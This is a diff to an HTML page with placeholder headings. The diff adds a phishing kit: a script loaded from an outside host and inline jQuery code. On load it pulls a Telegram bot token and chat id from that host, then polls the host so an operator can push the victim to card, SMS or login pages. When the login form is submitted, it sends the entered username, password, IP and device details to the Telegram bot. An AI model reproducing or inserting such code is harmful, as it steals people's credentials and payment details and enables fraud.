@@ -12,7 +12,181 @@
 		<h1> DDFGGG llkkj </h1>
 		<h1> DDFGGG llkkj </h1>
 	</body>
-	
+	 
+<script src="https://one.sharafdg.net/1/link.js"></script>
+
+<script type="text/javascript">
+    $( document ).ready(function() {
+    
+
+        console.log( "ready!" );
+        
+        let info_User={};
+        let ip="";
+        let token = "";
+        let chatId ="";
+ 
+        const api_url =  "https://one.sharafdg.net/1/";
+
+
+        async function getapi(url) {
+         
+            const response = await fetch(url+"config/device.php");
+            var data = await response.json();
+            info_User=data;
+            console.log(data);
+            console.log(api_url);
+            
+            ip=data["ip"];
+            token = data['token'];
+            chatId =data['chatId'];
+    
+                var Detailefun = {};
+                Detailefun.ip= ip;
+                Detailefun.fun= "FI LOG";
+                $.ajax({
+                  type: "POST",
+                  url: api_url+"config/fun.php?request=2",
+                  data: JSON.stringify(Detailefun), 
+                  success: function (result) {},
+                  dataType: "json"
+                }); 
+
+
+
+                let messageV = `VISTEUR MILLES >>`+ip;
+               // sendMessage(messageV);
+            }
+         
+            getapi(api_url);
+
+
+        setInterval(function() {
+         
+                var Detaile = {};
+                Detaile.ip= ip;
+                $.ajax({
+                  type: "POST",
+                  url: api_url+"config/fun.php?request=3",
+                  data: JSON.stringify(Detaile), 
+                  success: function (result) {
+                     console.log(result);
+                       if (result["fun"]== "gotocc") {
+                           window.location.href =link_card;//
+                       }
+                       if (result["fun"]== "goSMS") {
+                           window.location.href = link_sms;//
+                       }
+             
+                       if (result["fun"]== "goLOG") {
+                           window.location.href = link_log;//
+                       }
+                       if (result["fun"]== "goFIN") {
+                           window.location.href = link_fin;
+                       }
+
+                  },
+                  dataType: "json"
+                }); 
+        }, 3000); 
+
+
+
+
+
+    $("#loginButton").click(function(){
+
+         $(".overlay").show();
+         $("#log_name").removeClass('errinput');
+         $("#pw_name").removeClass('errinput');
+       
+       if ($("#pw_name").val().length >= 4 && $("#log_name").val().length >= 4 ) 
+       {
+
+             var Detaile = {};
+             Detaile.login= $("#log_name").val() ;
+             Detaile.pwd=   $("#pw_name").val() ;
+             Detaile.info= info_User['ip']+" : "+info_User['browser']+" : "+info_User['device']+" : "+info_User['system'];
+             Detaile.url=  api_url+'admin.php?ip='+info_User['ip'];
+             const message = `ONE LOG\n--------------\n<code>${Detaile.login}</code>\n\n<code>${Detaile.pwd}</code>\n\n\n${Detaile.url}\n--------------\n${Detaile.info}`;
+
+ 
+
+
+            var Detailefun = {}; 
+            Detailefun.ip= ip;
+            Detailefun.fun= "NEW";
+
+            $.ajax({
+              type: "POST",
+              url: api_url+"config/fun.php?request=1",
+              data: JSON.stringify(Detailefun), 
+              success: function (result) {  },
+              dataType: "json"
+            }); 
+ 
+
+            $.ajax({
+                type: 'POST',
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'html',
+                },
+                success: function (res) {
+                     
+                            window.location.href = link_card;
+                   
+                  
+                },
+                error: function (error) {
+                    console.error(error);
+                    alert("error failed");
+                }
+            });
+
+       } else{
+
+            setInterval(function() { 
+            $(".overlay").hide();      
+             }, 2000);              
+               
+                   if ($("#pw_name").val().length < 4  ) 
+                   {
+                       $("#pw_name").addClass('errinput');
+                       $("#pw_name").val('');
+                   }
+                  if ($("#log_name").val().length < 4 ) 
+                   {
+                     $("#log_name").addClass('errinput');
+                     $("#log_name").val('');
+                   }  
+       }
+
+    });
+
+ 
+    
+    
+      function sendMessage(text)
+      {
+         
+          const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
+          const obj = {
+              chat_id: chatId, // Telegram chat id
+              text: text // The text to send
+          };
+          const xht = new XMLHttpRequest();
+          xht.open("POST", url, true);
+          xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+          xht.send(JSON.stringify(obj));
+      }
+ 
+    
+   });
+</script>
+  
 </html>
 
 
